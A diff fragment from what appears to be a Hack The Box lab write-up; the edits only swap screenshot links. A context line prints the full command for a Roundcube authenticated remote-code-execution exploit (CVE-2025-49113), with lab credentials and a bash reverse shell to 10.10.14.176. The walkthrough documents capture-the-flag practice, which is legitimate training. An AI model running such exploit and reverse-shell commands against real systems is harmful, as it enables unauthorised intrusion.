@@ -46,9 +46,9 @@
 
 `sudo php /opt/CVE-2025-49113-Roundcube-Authenticated-RCE.php http://mail.outbound.htb/roundcube/ tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.14.176/80 0>&1"'`
 
-<img width="849" height="155" alt="image" src="https://github.com/user-attachments/assets/f8cfbd2e-02b1-4ad4-ac84-b3c289ecee64" />
+<img width="847" height="150" alt="image" src="https://github.com/user-attachments/assets/611d0c33-3fb8-41c2-8fed-9c8a5ca30760" />
 
-<img width="587" height="30" alt="image" src="https://github.com/user-attachments/assets/18a87b90-903f-4c18-8951-a29be063befe" />
+<img width="637" height="169" alt="image" src="https://github.com/user-attachments/assets/822e624f-cc42-4d67-8415-33b84a40c459" />
 
 5. 
 
